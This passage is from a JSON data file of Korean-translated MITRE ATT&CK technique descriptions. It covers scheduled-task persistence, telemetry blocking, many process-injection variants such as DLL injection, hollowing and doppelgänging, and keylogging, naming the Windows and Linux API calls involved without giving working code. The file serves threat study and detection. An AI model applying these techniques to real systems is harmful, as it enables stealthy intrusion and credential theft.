Linux 메일 2018년 7월 8일) 권한 있는 경로를 사용하여 설치된 타이머는 루트 수준의 지속성을 유지하는 데 사용될 수 있습니다. 적대자는 사용자 수준의 지속성을 달성하기 위해 사용자 수준 타이머를 설치할 수도 있습니다. (출처: Falcon Sandbox smp: 28553b3a9d)",
      "external_id": "T1053.006",
      "modified": "2024-10-15T16:42:51.536Z",
      "title": "Systemd Timers",
      "translated": true
    },
    {
      "description": "적대자는 Kubernetes와 같은 컨테이너 오케스트레이션 도구에서 제공하는 작업 예약 기능을 악용하여 악성 코드를 실행하도록 구성된 컨테이너의 배포를 예약할 수 있습니다. 컨테이너 오케스트레이션 작업은 특정 날짜와 시간에 이러한 자동화된 작업을 실행합니다. 이는 리눅스 시스템의 크론 작업과 유사합니다. 이러한 유형의 배포는 클러스터 내에서 지속성을 유지하는 프로세스를 자동화하여 시간이 지남에 따라 컨테이너의 수를 유지하도록 구성될 수 있습니다.\n\nKubernetes에서는 CronJob을 사용하여 특정 작업을 수행하기 위해 하나 이상의 컨테이너가 실행되는 Job을 예약할 수 있습니다. 따라서 적대자는 CronJob을 활용하여 클러스터 내의 여러 노드에서 악성 코드를 실행하는 Job의 배포를 예약할 수 있습니다.",
      "external_id": "T1053.007",
      "modified": "2024-10-15T16:26:03.731Z",
      "title": "Container Orchestration Job",
      "translated": true
    },
    {
      "description": "적대자는 일반적으로 센서에 의해 수집되고 분석되는 지표나 사건을 차단하려고 시도할 수 있습니다. 이는 악의적으로 이벤트 전송(Event Tracing for Windows, ETW)를 리디렉션하거나 (인용: Microsoft Lamin 2017년 9월) 심지어 호스트 기반 센서를 비활성화하는 것을 포함할 수 있으며, 이벤트 텔레메트리의 수집 및 흐름을 제어하는 설정을 조작함으로써 이루어질 수 있습니다. (인용: Medium Event Tracing Tampering 2018) 이러한 설정은 시스템의 구성 파일 및/또는 레지스트리에 저장되며, [PowerShell](https://attack.mitre.org/techniques/T1086) 또는 [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)과 같은 관리 유틸리티를 통해 접근할 수 있습니다.\n\nETW 중단은 여러 방법으로 달성될 수 있지만, 가장 직접적인 방법은 PowerShell의 Set-EtwTraceProvider cmdlet을 사용하여 조건을 정의하거나 레지스트리에 직접 인터페이스하여 변경을 수행하는 것입니다.\n\n지표의 네트워크 기반 보고의 경우, 적대자는 중앙 분석을 방지하기 위해 보고와 관련된 트래픽을 차단할 수 있습니다. 이는 텔레메트리를 전달하는 책임이 있는 로컬 프로세스를 중지하거나 이벤트 집계와 관련된 특정 호스트로의 트래픽을 차단하는 호스트 기반 방화벽 규칙을 생성하는 등 여러 방법으로 수행될 수 있습니다. (예: 보안 정보 및 이벤트 관리(SIEM) 제품)",
      "external_id": "T1054",
      "modified": "2020-03-19T19:10:25.404Z",
      "title": "Indicator Blocking",
      "translated": true
    },
    {
      "description": "공격자는 프로세스 기반 방어를 회피하고 권한 상승을 가능하게 하기 위해 코드 주입을 할 수 있습니다. 프로세스 주입은 별도의 활성 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다. 다른 프로세스의 맥락에서 코드를 실행하면 해당 프로세스의 메모리, 시스템/네트워크 자원에 접근할 수 있으며, 승격된 권한을 얻을 수 있습니다. 프로세스 주입을 통한 실행은 적법한 프로세스 아래에서 수행되기 때문에 보안 제품의 탐지를 회피할 수도 있습니다.\n\n프로세스에 코드를 주입하는 방법은 여러 가지가 있으며, 이 중 많은 방법은 정당한 기능을 악용합니다. 이러한 구현은 모든 주요 운영 체제에서 존재하지만 일반적으로 플랫폼별로 다릅니다.\n\n보다 정교한 샘플은 여러 개의 프로세스 주입을 수행하여 모듈을 분리하고 탐지를 더욱 회피하는 방법을 사용할 수 있으며, 이 경우 명명된 파이프(named pipes)나 기타 프로세스 간 통신(IPC) 메커니즘을 통신 채널로 활용합니다.",
      "external_id": "T1055",
      "modified": "2023-03-30T21:01:45.488Z",
      "title": "Process Injection",
      "translated": true
    },
    {
      "description": "적대자는 프로세스 기반 방어를 우회하고 권한을 상승시킬 수 있는 방법으로 동적 링크 라이브러리(DLL)를 프로세스에 주입할 수 있습니다. DLL 주입은 별도의 라이브 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nDLL 주입은 일반적으로 타겟 프로세스의 가상의 주소 공간에 DLL 경로를 기록한 후, 새로운 스레드를 호출하여 DLL을 로드하는 방식으로 수행됩니다. 이 작업은 <code>VirtualAllocEx</code> 및 <code>WriteProcessMemory</code>와 같은 네이티브 Windows API 호출을 통해 수행할 수 있으며, 이후 <code>CreateRemoteThread</code>를 통해 호출됩니다. 이 함수는 DLL을 로드하는 역할을 하는 <code>LoadLibrary</code> API를 호출합니다. (출처: Elastic Process Injection 2017년 7월)\n\n이 방법의 변형으로는 반사형 DLL 주입(프로세스에 자기 매핑 DLL을 기록하는 방법)과 메모리 모듈(프로세스에 기록할 때 DLL을 맵하는 방법)이 있으며, 이들은 주소 재배치 문제와 실행을 호출하기 위한 추가 API의 필요성을 극복합니다. (이 방법들은 <code>LoadLibrary</code> 함수의 기능을 수동으로 수행하여 메모리 내에서 파일을 로드하고 실행합니다.) (출처: Elastic HuntingNMemory 2017년 6월)(출처: Elastic Process Injection 2017년 7월)\n\n이 방법의 또 다른 변형인 모듈 스톰핑/오버로딩(Module Stomping/Overloading) 또는 DLL 홀로잉(DLL Hollowing) 방식은 프로세스 내에서 주입된 코드를 숨기기 위해 활용될 수 있습니다. 이 방법은 원격 프로세스에 합법적인 DLL을 로드한 후, 타겟 프로세스에서 새로운 스레드를 시작하기 전에 모듈의 <code>AddressOfEntryPoint</code>를 수동으로 덮어쓰는 방식입니다. (출처: Module Stomping for Shellcode Injection) 이 변형은 공격자가 합법적인 DLL 파일을 디스크에서 백업하여 악성 주입 코드를 숨길 수 있도록 합니다. (출처: Hiding Malicious Code with Module Stomping)\n\n다른 프로세스의 컨텍스트에서 코드를 실행하면 그 프로세스의 메모리, 시스템/네트워크 자원에 접근할 수 있으며, 권한 상승 가능성도 있습니다. DLL 주입을 통한 실행은 합법적인 프로세스 아래에서 실행이 감춰지기 때문에 보안 제품의 탐지를 피할 수도 있습니다.",
      "external_id": "T1055.001",
      "modified": "2023-08-11T21:34:38.558Z",
      "title": "Dynamic-link Library Injection",
      "translated": true
    },
    {
      "description": "공격자는 프로세스 기반 방어를 피하고 권한 상승을 할 수 있는 방법으로 포터블 실행 파일(PE)을 다른 프로세스에 주입할 수 있습니다. PE 주입은 별도의 실시간 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nPE 주입은 일반적으로 디스크에 파일 없이 코드를 복사한 후, 새로운 스레드를 통해 대상 프로세스를 호출하기 위해 대상 프로세스의 가상 주소 공간에 코드를 삽입하는 방식으로 수행됩니다. 이 쓰기는 `VirtualAllocEx` 및 `WriteProcessMemory`와 같은 네이티브 윈도우 API 호출을 통해 수행될 수 있으며, `CreateRemoteThread` 또는 추가 코드(예: 셸코드)를 통해 호출됩니다. 주입된 코드의 이동은 메모리 참조를 다시 매핑하는 기능을 추가적으로 요구합니다. (출처: Elastic Process Injection July 2017)\n\n다른 프로세스의 컨텍스트에서 코드를 실행하면 해당 프로세스의 메모리, 시스템/네트워크 리소스에 접근할 수 있으며, 가능성에 따라 권한 상승을 할 수 있습니다. PE 주입을 통한 실행은 합법적인 프로세스 아래에서 실행이 마스킹되기 때문에 보안 제품의 탐지를 피할 수도 있습니다.",
      "external_id": "T1055.002",
      "modified": "2021-10-18T12:21:11.178Z",
      "title": "Portable Executable Injection",
      "translated": true
    },
    {
      "description": "공격자는 프로세스 기반 방어를 회피하고 권한을 상승시키기 위해 하이재킹된 프로세스에 악성 코드를 주입할 수 있습니다. 스레드 실행 하이재킹(Thread Execution Hijacking)은 별도의 활성 프로세스의 주소 공간에서 임의 코드를 실행하는 방법입니다.\n\n스레드 실행 하이재킹은 일반적으로 기존 프로세스를 일시 중지한 다음 메모리를 언맵(unmap)하거나 홀로잉(hollowing)하는 방식으로 수행되며, 이 메모리는 악성 코드 또는 DLL 경로로 대체될 수 있습니다. 최초에 기존 피해 프로세스에 대한 핸들이 <code>OpenThread</code>와 같은 네이티브 Windows API 호출을 통해 생성됩니다. 이 시점에서 프로세스는 일시 중지된 후 악성 코드로 재정렬되고, <code>SuspendThread</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, <code>ResumeThread</code>와 같은 호출을 통해 다시 실행될 수 있습니다.(출처: Elastic Process Injection 2017년 7월)\n\n이는 [프로세스 홀로잉(Process Hollowing)](https://attack.mitre.org/techniques/T1055/012)과 매우 유사하지만, 일시 중지 상태의 프로세스를 생성하는 대신 기존 프로세스를 대상으로 합니다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하면 해당 프로세스의 메모리, 시스템/네트워크 리소스에 접근할 수 있으며, 권한 상승도 가능할 수 있습니다. 스레드 실행 하이재킹을 통한 실행은 정당한 프로세스 아래에서 실행이 감춰지기 때문에 보안 제품의 탐지를 회피할 수도 있습니다.",
      "external_id": "T1055.003",
      "modified": "2021-10-18T12:22:50.800Z",
      "title": "Thread Execution Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 프로세스 기반 방어를 회피하고 권한을 상승시키기 위해 비동기 호출(Asynchronous Procedure Call, APC) 큐를 통해 악성 코드를 프로세스에 주입할 수 있습니다. APC 주입은 별도의 라이브 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nAPC 주입은 일반적으로 악성 코드를 프로세스의 스레드(APC Queue)에 연결하여 수행됩니다. 큐에 등록된 APC 함수는 스레드가 변경 가능한 상태에 들어갈 때 실행됩니다. 이때 공격자는 `OpenThread`와 같은 기본 Windows API 호출로 기존 피해 프로세스에 대한 핸들을 생성합니다. 이 시점에서 `QueueUserAPC`를 사용하여 함수(예: 악성 DLL을 지칭하는 `LoadLibraryA`)를 호출할 수 있습니다.\n\n\"얼리 버드 주입(Early Bird injection)\"이라고 불리는 APC 주입의 변형은 프로세스의 진입 점(및 이후의 안티멀웨어 훅) 앞에서 악성 코드를 작성하고 실행할 수 있는 일시 중지된 프로세스를 생성하는 방법입니다. 또한 \"아톰 봄(AtomBombing)\"(Citation: ENSIL AtomBombing Oct 2016)은 APC를 활용하여 글로벌 아톰 테이블에 미리 작성된 악성 코드를 호출하는 또 다른 변형입니다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하면 프로세스의 메모리, 시스템/네트워크 리소스에 접근할 수 있고, 권한 상승이 가능할 수 있습니다. APC 주입을 통한 실행은 합법적인 프로세스 아래에서 마스킹 되기 때문에 보안 제품의 감지를 회피할 수도 있습니다.",
      "external_id": "T1055.004",
      "modified": "2021-10-18T12:23:46.476Z",
      "title": "Asynchronous Procedure Call",
      "translated": true
    },
    {
      "description": "위협 행위자들은 스레드 로컬 저장소(TLS) 콜백을 통해 프로세스에 악성 코드를 주입하여 프로세스 기반 방어를 회피하고, 권한 상승을 시도할 수 있습니다. TLS 콜백 주입은 별도의 실행 중인 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nTLS 콜백 주입은 포터블 실행 파일(PE) 내의 포인터를 조작하여 프로세스가 코드의 합법적인 진입 지점에 도달하기 전에 악성 코드로 리디렉션되도록 하는 것입니다. TLS 콜백은 일반적으로 운영 체제에서 스레드에서 사용되는 데이터의 설정 및/또는 정리를 위해 사용됩니다. TLS 콜백을 조작하는 것은 [프로세스 주입](https://attack.mitre.org/techniques/T1055)과 같은 다른 기술을 사용하여 특정 오프셋에 메모리 공간에 할당하고 기록함으로써 수행할 수 있습니다. ([출처: FireEye TLS Nov 2017](https://attack.mitre.org/techniques/T1055)).\n\n다른 프로세스의 컨텍스트에서 코드를 실행하는 것은 해당 프로세스의 메모리, 시스템/네트워크 자원에 대한 접근을 허용할 수 있으며, 권한 상승 가능성도 있습니다. TLS 콜백 주입을 통한 실행은 합법적인 프로세스 아래에서 숨겨져 있기 때문에 보안 제품의 탐지를 회피할 수 있습니다.",
      "external_id": "T1055.005",
      "modified": "2021-10-18T12:24:54.198Z",
      "title": "Thread Local Storage",
      "translated": true
    },
    {
      "description": "적대자들은 프로세스 기반 방어를 회피하고 권한을 상승시킬 가능성을 높이기 위해 ptrace(프로세스 추적) 시스템 호출을 통해 악성 코드를 프로세스에 주입할 수 있습니다. Ptrace 시스템 호출 주입은 별도의 실행 중인 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nPtrace 시스템 호출 주입은 실행 중인 프로세스에 연결하고 그것을 수정하는 과정을 포함합니다. ptrace 시스템 호출은 디버깅 프로세스가 다른 프로세스(각 개별 스레드 포함)를 관찰하고 제어할 수 있게 해주며, 메모리 및 레지스터 값을 변경하는 것을 포함합니다.(출처: PTRACE 매뉴얼) Ptrace 시스템 호출 주입은 일반적으로 실행 중인 프로세스에 임의의 코드를 작성한 후(예: <code>malloc</code>) <code>PTRACE_SETREGS</code>를 호출하여 실행할 다음 명령어를 포함하는 레지스터를 설정함으로써 수행됩니다. Ptrace 시스템 호출 주입은 또한 <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>를 사용하여 특정 주소(예: 다음 명령어의 현재 주소)로 데이터를 복사함으로써 이루어질 수 있습니다.(출처: PTRACE 매뉴얼)(출처: Medium Ptrace JUL 2018)\n\nPtrace 시스템 호출 주입은 비자식 프로세스나 권한이 더 높은 프로세스를 대상으로 할 경우 불가능할 수 있습니다.(출처: BH Linux Inject)\n\n다른 프로세스의 컨텍스트에서 코드를 실행하는 것은 해당 프로세스의 메모리, 시스템/네트워크 리소스에 대한 접근을 가능하게 하고, 권한 상승이 일어날 수 있습니다. ptrace 시스템 호출 주입을 통한 실행은 합법적인 프로세스 아래에서 실행되므로 보안 제품의 탐지를 회피할 수 있습니다.",
      "external_id": "T1055.008",
      "modified": "2021-10-18T12:26:31.766Z",
      "title": "Ptrace System Calls",
      "translated": true
    },
    {
      "description": "공격자는 /proc 파일 시스템을 통해 프로세스에 악성 코드를 주입하여 프로세스 기반 방어를 회피하고, 권한을 상승시킬 수 있습니다. Proc 메모리 주입은 별도의 활성 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nProc 메모리 주입은 /proc 파일 시스템(<code>/proc/[pid]</code>)을 통해 프로세스의 메모리를 열거한 다음, 사용 가능한 가젯/명령어가 포함된 리턴 지향 프로그래밍(ROP) 페이로드를 작성하는 것을 포함합니다. 각 실행 중인 프로세스는 메모리 매핑을 포함하는 고유의 디렉토리를 가지고 있습니다. Proc 메모리 주입은 일반적으로 /proc 파일 시스템에서 제공하는 메모리 매핑을 사용하여 대상 프로세스의 스택을 덮어쓰는 방식으로 수행됩니다. 이 정보는 스택을 포함한 오프셋과 가젯(악성 페이로드를 구성하는 데 사용할 수 있는 프로그램 내의 명령어)을 열거하는 데 사용될 수 있으며, 이는 주소 공간 배치 무작위화(ASLR)와 같은 프로세스 메모리 보호에 의해 숨겨져 있습니다. 일단 열거되면, <code>/proc/[pid]/maps</code> 내의 대상 프로세스의 메모리 맵은 dd를 사용하여 덮어쓸 수 있습니다. (출처: Uninformed Needle)(출처: GDS Linux Injection)(출처: DD Man)\n\n[동적 링커 하이재킹](https://attack.mitre.org/techniques/T1574/006)과 같은 다른 기술이 사용되어 대상 프로세스를 더 많은 가젯으로 채울 수 있습니다. [프로세스 홀로잉](https://attack.mitre.org/techniques/T1055/012)과 유사하게, proc 메모리 주입은 자식 프로세스(예: 백그라운드에서 실행된 sleep의 복사본)를 타겟으로 할 수 있습니다. (출처: GDS Linux Injection)\n\n다른 프로세스의 컨텍스트에서 코드를 실행하면 프로세스의 메모리, 시스템/네트워크 리소스에 대한 접근 및 권한 상승이 가능할 수 있습니다. Proc 메모리 주입을 통한 실행은 정당한 프로세스 아래에서 숨겨지기 때문에 보안 제품의 탐지를 회피할 수도 있습니다.",
      "external_id": "T1055.009",
      "modified": "2020-06-20T22:25:55.331Z",
      "title": "Proc Memory",
      "translated": true
    },
    {
      "description": "위험 요소는 프로세스 기반 방어를 회피하고 권한 상승을 가능하게 하기 위해 Extra Window Memory (EWM)를 통해 악성 코드를 프로세스에 주입할 수 있습니다. EWM 주입은 다른 활성 프로세스의 주소 공간에서 임의 코드를 실행하는 방법입니다.\n\n그래픽 Windows 기반 프로세스를 생성하기 전에, 윈도우 클래스에 대한 규정을 두거나 해당 클래스를 등록해야 합니다. 이는 외관과 동작을 규정하며(입출력 데이터를 처리하는 함수인 윈도우 프로시저를 통해 이루어짐) 새로운 윈도우 클래스를 등록할 때 최대 40바이트의 EWM를 클래스의 각 인스턴스에 할당된 메모리에 추가해 달라는 요청이 포함될 수 있습니다. 이 EWM는 해당 윈도우에 특정한 데이터를 저장하기 위한 것으로, 값을 설정하고 가져오기 위한 특정 응용 프로그램 프로그래밍 인터페이스 (API) 함수가 존재합니다.\n\n작은 크기지만 EWM는 32비트 포인터를 저장할 수 있을 만큼 충분히 크고, 종종 윈도우 프로시저를 가리키는 데 사용됩니다. 악성 소프트웨어는 이 메모리 위치를 공격 체인의 일부로 이용할 수 있으며, 여기에는 프로세스의 메모리의 공유 섹션에 코드를 쓰고, EWM에 코드에 대한 포인터를 배치한 후, 프로세스의 EWM 주소에 제어를 반환하여 실행을 호출하는 과정이 포함됩니다.\n\nEWM 주입을 통한 실행은 대상 프로세스의 메모리에 접근할 수 있을 뿐만 아니라, 권한 상승도 가능하게 할 수 있습니다. 공유 섹션에 페이로드를 작성하는 것은 <code>WriteProcessMemory</code> 및 <code>CreateRemoteThread</code>와 같은 고도로 모니터링되는 API 호출의 사용을 피하는 방법이기도 합니다. 보다 정교한 악성 소프트웨어 샘플은 윈도우 프로시저 및 기타 시스템 기능의 조합을 통해 대상 프로세스의 실행 가능한 부분 내에서 악성 페이로드를 재작성함으로써 데이터 실행 방지(DEP)와 같은 보호 메커니즘을 우회할 가능성도 있습니다.\n\n다른 프로세스의 컨텍스트에서 코드를 실행하면 해당 프로세스의 메모리, 시스템/네트워크 리소스 및 권한 상승에 접근할 수 있습니다. EWM 주입을 통한 실행은 정당한 프로세스 아래에서 마스크되므로 보안 제품에서 탐지를 피할 수 있습니다.",
      "external_id": "T1055.011",
      "modified": "2020-11-10T18:29:31.004Z",
      "title": "Extra Window Memory Injection",
      "translated": true
    },
    {
      "description": "공격자는 프로세스 기반 방어를 회피하기 위해 중단된 프로세스나 비어 있는 프로세스에 악성 코드를 주입할 수 있습니다. 프로세스 홀로잉(process hollowing)은 별도의 실시간 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\n프로세스 홀로잉은 일반적으로 중단된 상태에서 프로세스를 생성한 다음, 해당 프로세스의 메모리를 언맵(Unmap)하거나 비우는 방식으로 수행되며, 그 후 악성 코드로 대체할 수 있습니다. 피해자 프로세스는 <code>CreateProcess</code>와 같은 네이티브 Windows API 호출을 통해 생성할 수 있으며, 여기에는 프로세스의 주요 스레드를 중단하는 플래그가 포함되어 있습니다. 이 시점에서, 프로세스는 <code>ZwUnmapViewOfSection</code> 또는 <code>NtUnmapViewOfSection</code>와 같은 API 호출을 사용하여 언맵된 후, 악성 코드로 실정렬(Realignment)되고 <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, 그리고 <code>ResumeThread</code>를 차례로 통해 재개됩니다. (인용: Leitch Hollowing)(인용: Elastic Process Injection July 2017)\n\n이 방법은 [스레드 로컬 저장소(Thread Local Storage)](https://attack.mitre.org/techniques/T1055/005)와 매우 유사하지만, 기존 프로세스를 대상으로 삼는 것이 아니라 새로운 프로세스를 생성합니다. 이러한 행동은 주입된 프로세스가 주입하는 프로세스에서 생성되었으므로(따라서 보안 컨텍스트를 상속하기 때문에) 권한 상승을 초래하지 않을 가능성이 높습니다. 그러나 프로세스 홀로잉을 통한 실행은 정당한 프로세스 아래에서 실행이 가려지기 때문에 보안 제품의 탐지를 피할 수도 있습니다.",
      "external_id": "T1055.012",
      "modified": "2024-09-12T15:11:45.602Z",
      "title": "Process Hollowing",
      "translated": true
    },
    {
      "description": "적대자들은 프로세스 기반 방어를 회피하고 권한을 상승시킬 수 있는 방법으로 프로세스 더블갱깅을 통해 악성 코드를 프로세스에 주입할 수 있습니다. 프로세스 더블갱깅은 별도의 실시간 프로세스의 주소 공간에서 임의 코드를 실행하는 방법입니다.\n\nWindows Transactional NTFS (TxF)는 안전한 파일 작업을 수행하기 위한 방법으로 Vista에서 도입되었습니다. (출처: Microsoft TxF) 데이터 무결성을 보장하기 위해 TxF는 주어진 시간에 파일에 쓸 수 있는 전송된 핸들을 하나만 허용합니다. 쓰기 핸들 트랜잭션이 종료될 때까지 모든 다른 핸들은 작성자와 분리되어 있으며, 핸들이 열릴 때 존재했던 파일의 커밋된 버전만 읽을 수 있습니다. (출처: Microsoft Basic TxF Concepts) 손상을 방지하기 위해 TxF는 쓰기 트랜잭션 중 시스템이나 애플리케이션이 실패할 경우 자동으로 롤백을 수행합니다. (출처: Microsoft Where to use TxF)\n\n비록 더 이상 사용되지 않지만, TxF의 애플리케이션 프로그래밍 인터페이스 (API)는 Windows 10에서도 여전히 활성화되어 있습니다. (출처: BlackHat Process Doppelgänging Dec 2017)\n\n적대자들은 TxF를 악용하여 [프로세스 인젝션](https://attack.mitre.org/techniques/T1055)의 파일리스 변형을 수행할 수 있습니다. [프로세스 홀로윙](https://attack.mitre.org/techniques/T1055/012)과 유사하게, 프로세스 더블갱깅은 합법적인 프로세스의 메모리를 교체하여 방어 및 탐지를 회피할 수 있는 악성 코드의 숨겨진 실행을 가능하게 합니다. TxF를 사용하는 프로세스 더블갱깅은 <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, <code>SetThreadContext</code>와 같은 고도로 모니터링되는 API 기능을 사용하지 않아서도 장점이 있습니다. (출처: BlackHat Process Doppelgänging Dec 2017)\n\n프로세스 더블갱깅은 다음의 4단계를 통해 구현됩니다. (출처: BlackHat Process Doppelgänging Dec 2017):\n\n* 트랜잭트 – 합법적인 실행 파일을 사용하여 TxF 트랜잭션을 생성한 후 악성 코드로 파일을 덮어씁니다. 이러한 변경 사항은 격리되며 트랜잭션의 맥락 내에서만 볼 수 있습니다.\n* 로드 – 공유 메모리 섹션을 생성하고 악성 실행 파일을 로드합니다.\n* 롤백 – 원래의 실행 파일에 대한 변경 사항을 취소하여 파일 시스템에서 악성 코드를 효과적으로 제거합니다.\n* 애니메이트 – 오염된 메모리 섹션에서 프로세스를 생성하고 실행을 시작합니다.\n\n이러한 행동은 주입된 프로세스가 (따라서 이를 주입하는 프로세스의 보안 컨텍스트를 상속하므로) 권한 상승으로 이어지지 않을 가능성이 높습니다. 그러나 프로세스 더블갱깅을 통한 실행은 합법적인 프로세스 아래에서 실행이 은폐되기 때문에 보안 제품으로부터 탐지를 회피할 수 있을 것입니다.",
      "external_id": "T1055.013",
      "modified": "2021-02-09T15:43:48.848Z",
      "title": "Process Doppelgänging",
      "translated": true
    },
    {
      "description": "공격자는 VDSO 하이재킹을 통해 프로세스에 악성 코드를 주입하여 프로세스 기반 방어를 회피하고, 권한을 상승시킬 수 있습니다. 가상 동적 공유 객체(virtual dynamic shared object, vdso) 하이재킹은 별도의 활성 프로세스의 주소 공간에서 임의의 코드를 실행하는 방법입니다.\n\nVDSO 하이재킹은 동적으로 연결된 공유 라이브러리에 대한 호출을 리다이렉션하는 방식으로 이루어집니다. 메모리 보호 기능은 [Ptrace 시스템 콜](https://attack.mitre.org/techniques/T1055/008)을 통해 프로세스에 실행 가능한 코드를 쓰는 것을 방지할 수 있습니다. 그러나 공격자는 vdso 공유 객체에서 프로세스에 매핑된 시스템 호출 인터페이스 코드 스텁을 하이재킹하여 악성 공유 객체를 열고 매핑하기 위해 syscalls를 실행할 수 있습니다. 이 코드는 프로세스의 글로벌 오프셋 테이블에 저장된 패치된 메모리 주소 참조를 통해 프로세스의 실행 흐름을 리다이렉션하여 호출될 수 있습니다(이 테이블은 매핑된 라이브러리 함수의 절대 주소를 저장합니다). (인용: ELF Injection May 2009)(인용: Backtrace VDSO)(인용: VDSO Aug 2005)(인용: Syscall 2014)\n\n다른 프로세스의 컨텍스트에서 코드를 실행하면 프로세스의 메모리, 시스템/네트워크 자원에 접근할 수 있으며, 권한 상승이 가능할 수 있습니다. VDSO 하이재킹을 통한 실행은 합법적인 프로세스 아래에서 실행되므로 보안 제품의 탐지를 회피할 수 있습니다.",
      "external_id": "T1055.014",
      "modified": "2022-07-07T17:09:09.048Z",
      "title": "VDSO Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 프로세스 기반 방어를 회피하고 권한 상승을 가능하게 하기 위해 탈취된 프로세스에 악성 코드를 주입하기 위해 리스트 뷰 컨트롤을 악용할 수 있습니다. 리스트 플랜팅(ListPlanting)은 별도의 라이브 프로세스의 주소 공간에서 임의 코드를 실행하는 방법입니다. 리스트 플랜팅을 통해 실행된 코드는 정당한 프로세스 아래에서 실행되기 때문에 보안 제품의 탐지를 회피할 수 있습니다.\n\n리스트 뷰 컨트롤은 항목 모음을 표시하는 데 사용되는 사용자 인터페이스 창입니다. 응용 프로그램의 리스트 뷰 설정에 대한 정보는 프로세스의 메모리 내에서 <code>SysListView32</code> 컨트롤에 저장됩니다.\n\n리스트 플랜팅(메시지 전달 \"셔터 공격\"의 한 형태)은 리스트 뷰 컨트롤을 사용하는 프로세스의 가상 주소 공간에 코드를 복사한 후, 해당 코드를 사용자 정의 콜백으로 사용하여 나열된 항목을 정렬하는 방식으로 수행될 수 있습니다. 공격자는 먼저 피해 프로세스의 메모리 공간에 코드를 복사해야 하며, 이는 Windows API 호출인 <code>FindWindow</code> 및/또는 <code>EnumWindows</code>를 통해 피해 프로세스 창의 <code>SysListView32</code> 자식에 대한 핸들을 직접 얻거나 다른 [프로세스 주입](https://attack.mitre.org/techniques/T1055) 방법을 통해 수행할 수 있습니다.\n\n리스트 플랜팅의 일부 변형은 대상 프로세스에 메모리를 할당하지만, 매우 모니터링되는 <code>WriteProcessMemory</code> 함수를 사용하지 않기 위해 윈도우 메시지를 사용하여 페이로드를 복사합니다. 예를 들어, 공격자는 <code>PostMessage</code> 및/또는 <code>SendMessage</code> API 함수를 사용하여 <code>LVM_SETITEMPOSITION</code> 및 <code>LVM_GETITEMPOSITION</code> 메시지를 전송함으로써, 효과적으로 할당된 메모리에 페이로드를 2바이트씩 복사할 수 있습니다.\n\n마지막으로, 페이로드는 프로세스 창의 <code>SysListView32</code> 자식에게 <code>LVM_SORTITEMS</code> 메시지를 전송함으로써 트리거되며, 새롭게 할당된 버퍼 내의 페이로드가 <code>ListView_SortItems</code> 콜백으로 전달되어 실행됩니다.",
      "external_id": "T1055.015",
      "modified": "2024-08-14T17:34:33.948Z",
      "title": "ListPlanting",
      "translated": true
    },
    {
      "description": "적대적 행위자는 사용자 입력을 캡처하는 방법을 사용하여 자격 증명을 얻거나 정보를 수집할 수 있습니다. 정상적인 시스템 사용 중에 사용자는 로그인 페이지/포털이나 시스템 대화 상자와 같은 다양한 위치에 자격 증명을 제공하는 경우가 많습니다. 입력 캡처 메커니즘은 사용자에게 투명하게 작동할 수 있으며(예: [자격 증명 API 훅킹](https://attack.mitre.org/techniques/T1056/004)), 또는 사용자가 진짜 서비스라고 믿게 만드는 방식으로 입력을 제공하도록 속일 수도 있습니다(예: [웹 포털 캡처](https://attack.mitre.org/techniques/T1056/003)).",
      "external_id": "T1056",
      "modified": "2024-08-13T17:33:45.244Z",
      "title": "Input Capture",
      "translated": true
    },
    {
      "description": "적대자는 사용자가 입력하는 동안 자격 증명을 가로채기 위해 사용자 키스트로크를 기록할 수 있습니다. 키로깅은 [OS 자격 증명 덤핑](https://attack.mitre.org/techniques/T1003) 시도가 효과적이지 않을 때 새로운 접근 기회를 위해 자격 증명을 획득하는 데 사용될 가능성이 높으며, 자격 증명을 성공적으로 캡처하기 위해 상당한 기간 동안 시스템에서 키스트로크를 가로채야 할 수도 있습니다. 자격 증명을 신속하게 캡처할 가능성을 높이기 위해 적대자는 사용자가 시스템에 재인증하도록 강제하기 위해 브라우저 쿠키를 삭제하는 등의 작업을 수행할 수도 있습니다. (출처: Talos Kimsuky 2021년 11월)\n\n키로깅은 입력 캡처의 가장 일반적인 유형이며, 키스트로크를 가로채는 다양한 방법이 있습니다. (출처: Adventures of a Keystroke) 일부 방법에는 다음이 포함됩니다:\n\n* 키스트로크 처리를 위해 사용되는 API 콜백을 후킹하는 방법. [자격 증명 API 후킹](https://attack.mitre.org/techniques/T1056/004)과는 달리, 이는 키 스트로크 데이터 처리를 위한 API 기능에만 집중합니다.\n* 하드웨어 버퍼에서 원시 키스트로크 데이터를 읽는 방법.\n* Windows 레지스트리 수정.\n* 맞춤형 드라이버.\n* [시스템 이미지 수정](https://attack.mitre.org/techniques/T1601)은 적대자에게 네트워크 장치의 운영 체제에 후킹하여 로그인 세션에 대한 원시 키스트로크를 읽을 수 있는 방법을 제공할 수 있습니다. (출처: Cisco Blog Legacy Device Attacks)",
      "external_id": "T1056.001",
      "modified": "2023-10-01T14:01:12.167Z",
      "title": "Keylogging",
      "translated": true
    },
    {
